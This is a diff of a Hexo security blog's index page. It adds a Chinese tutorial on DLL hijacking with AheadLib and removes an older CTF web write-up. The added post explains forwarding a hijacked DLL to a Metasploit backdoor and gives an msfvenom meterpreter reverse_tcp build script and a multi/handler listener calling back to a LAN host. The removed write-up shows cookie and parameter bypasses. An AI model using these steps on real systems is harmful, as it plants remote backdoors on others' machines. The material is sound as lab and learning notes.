@@ -145,6 +145,101 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Glacier">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/" class="post-title-link" itemprop="url">dll劫持与AheadLib</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-08-18 17:49:24 / Modified: 17:54:58" itemprop="dateCreated datePublished" datetime="2022-08-18T17:49:24+08:00">2022-08-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="dll劫持与AheadLib"><a href="#dll劫持与AheadLib" class="headerlink" title="dll劫持与AheadLib"></a>dll劫持与AheadLib</h1><p>最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下</p>
+<h3 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h3><p>dll文件是计算机上的一类文件，提供给使用者一些开箱即用的变量、函数或类。库文件分为静态库和动态库，静态库和动态库的区别体现在程序的链接阶段：静态库在程序的链接阶段被复制到了程序中；动态库在链接阶段没有被复制到程序中，而是程序在运行时由系统动态加载到内存中供程序调用。使用动态库系统只需载入一次，不同的程序可以得到内存中相同的动态库的副本，因此节省了很多内存，而且使用动态库也便于模块化更新程序</p>
+<p>dll劫持是当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间</p>
+<blockquote>
+<p>简单来说，dll的存在就是方便程序来直接调用，避免将相同的内容重复多遍，以此来节省内存<br>而dll劫持，由下面一个例子说明</p>
+</blockquote>
+<p>一个可执行文件运行时，需要调用<code>test.dll</code>文件，但此时我们可以生成一个恶意的<code>test.dll</code>文件，并让他调用我们由msf生成的<code>shell.dll</code>或者其他后门，再调用原来的<code>test.dll</code>文件</p>
+<p><img src="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png" alt="图解dll劫持"></p>
+<p>如果dll劫持成功了，那原本的可执行文件仍将正常使用，但我们的后门也将成功执行，即msf上线</p>
+<h3 id="AheadLib"><a href="#AheadLib" class="headerlink" title="AheadLib"></a>AheadLib</h3><p>这里推荐一个用来生成dll转发的工具<a target="_blank" rel="noopener" href="https://github.com/Yonsm/AheadLib">AheadLib</a></p>
+<p>我们随便找一个dll文件来测试一下</p>
+<p><img src="https://s2.loli.net/2022/08/18/wp5fkSX9FNlmr2L.png"></p>
+<p>我们把它生成的代码复制下来，用VisualStudio创建一个dll动态链接项目，但在这里，可能会出现比较多的问题<br>我这里使用的是ViusalStudio 2019 不同的版本可能会出现的问题不同</p>
+<p>首先项目提示我没有引入头文件，于是我加上了<code>#include &quot;pch.h&quot;</code><br>紧接着出现了如下的报错</p>
+<p><img src="https://s2.loli.net/2022/08/18/BAQiGUXbHg3z8wC.png"></p>
+<p>解决方法是，在<code>项目-&gt;属性-&gt;高级-&gt;字符集</code> 改为使用多字节字符集</p>
+<p><img src="https://s2.loli.net/2022/08/18/1JIjvcpbeUgOWFq.png"></p>
+<p>其他版本的可能存在不同的报错，可以尝试如下方法</p>
+<ol>
+<li>将运行库改为多线程(/MT)<br><img src="https://s2.loli.net/2022/08/18/zank6NWHustC2cR.png"></li>
+<li>将预编译头改为不使用<br><img src="https://s2.loli.net/2022/08/18/1ka4ZxJv6BO32WD.png"></li>
+</ol>
+<p>确认应用之后就只会有一个报错，我们不用管它，在Release x86的模式下，成功生成dll文件<br>成功处理好报错信息后，我们实现了由<code>test(evil).dll -&gt; test(org).dll</code><br>接下来实现<code>test(evil).dll-&gt;shell.dll</code><br>我们在AheadLib工具生成的cpp文件中，找到<code>DLLMain</code>函数，并加上我们需要调用的后门<code>shell.dll</code></p>
+<p><img src="https://s2.loli.net/2022/08/18/Qrme8qxodRO3NGs.png"></p>
+<p>成功编译后，将生成的dll文件改为与原dll相同的名字，即<code>test.dll</code>，将原本的test.dll改为<code>testorg.dll</code><br>这样我们就完成了dll劫持，当运行可执行文件时，将会先调用我们改写的<code>test.dll</code></p>
+<p>最后，msf成功上线</p>
+<p><img src="https://s2.loli.net/2022/08/18/ylZoMNxTp2Pfire.png"></p>
+<hr>
+<h3 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h3><p>最近浅浅的看了下sh文件的写法，于是就想到了写一些msf的sh文件，避免了每次使用msfconsole的复杂配置与msfvenum生成的复杂参数</p>
+<blockquote>
+<p>msfvenum的生成</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ip=192.168.31.208</span><br><span class="line">port=4444</span><br><span class="line">arch=x86</span><br><span class="line">platform=windows</span><br><span class="line">format=exe</span><br><span class="line">payload=windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="comment">#use exploit/muilt/handler</span></span><br><span class="line">out=../meter_re_tcp_x86.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p <span class="variable">$payload</span> LHOST=<span class="variable">$ip</span> LPORT=<span class="variable">$port</span> -f <span class="variable">$format</span> -a <span class="variable">$arch</span> --platform <span class="variable">$platform</span> -o <span class="variable">$out</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>msfconsole的监听</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.31.208</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -834,86 +929,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://silver-glacier.github.io/2021/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-buy-flag/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Glacier">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-buy-flag/" class="post-title-link" itemprop="url">极客大挑战2019-buy_flag</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-02-04 13:21:56" itemprop="dateCreated datePublished" datetime="2021-02-04T13:21:56+08:00">2021-02-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-02-06 13:28:53" itemprop="dateModified" datetime="2021-02-06T13:28:53+08:00">2021-02-06</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="极客大挑战2019-buy-flag"><a href="#极客大挑战2019-buy-flag" class="headerlink" title="极客大挑战2019-buy_flag"></a>极客大挑战2019-buy_flag</h1><p>首先打开题目，感觉这页面做的还挺好<br><img src="https://i.loli.net/2021/02/06/Tv4bFYsgQOhNIku.png"></p>
-<p>发现了一个buy.php，进去看一下<br><img src="https://i.loli.net/2021/02/06/ZinqNfLhDFPxlHE.png" alt="随便扫一眼"><br>这里好像有点提示</p>
-<p>打开源码看一下，有注释掉的内容<br><img src="https://i.loli.net/2021/02/06/QGyo3lnsk61hCiF.png"></p>
-<p>这个就是要把password写成404，但又不能全是数字，直接构造成404a，这个越过很简单</p>
-<p>先抓个包看一下<br><img src="https://i.loli.net/2021/02/06/K8LCpFAechu7vYa.png"><br>要求要成为他的学生，这可怎么办，突然发现cookie里面有一个user=0，感觉有点奇怪，把0改成1再来看</p>
-<p>现在就对了，接下来就是输入password了<br><img src="https://i.loli.net/2021/02/06/dHXmYrtq7BzDc32.png"></p>
-<p><img src="https://i.loli.net/2021/02/06/gTzHUOvC7EPo8yK.png" alt="这个passwrod成功越过了"><br>最后就是money了</p>
-<p><img src="https://i.loli.net/2021/02/06/hJgOukx68Iovedm.png" alt="它说money的数字长度太长了"><br>我看了网上一些大佬的wp，知道可以改成money[]来越过<br>但是我当时做的时候，就直接把它改成了科学计数法</p>
-<p><img src="https://i.loli.net/2021/02/06/rJU8I4iMGLDAO6Z.png"></p>
-<blockquote>
-<p>得到flag！</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -979,7 +998,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-count">31</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
